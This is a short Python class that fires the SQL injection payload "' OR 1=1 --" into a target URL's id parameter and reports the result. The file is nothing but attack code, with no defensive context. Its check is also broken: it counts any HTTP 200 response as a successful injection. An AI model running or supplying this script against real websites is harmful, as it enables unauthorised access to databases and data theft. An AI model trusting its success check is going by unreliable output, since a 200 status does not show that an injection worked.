import requests

class SQLInjection:
    def __init__(self):
        pass

    def perform_sql_injection(self, url):
        payload = "' OR 1=1 --"
        injection_url = f"{url}?id={payload}"
        response = requests.get(injection_url)
        if response.status_code == 200:
            print(f"SQL Injection successful on: {injection_url}")
        else:
            print(f"SQL Injection failed on: {injection_url}")
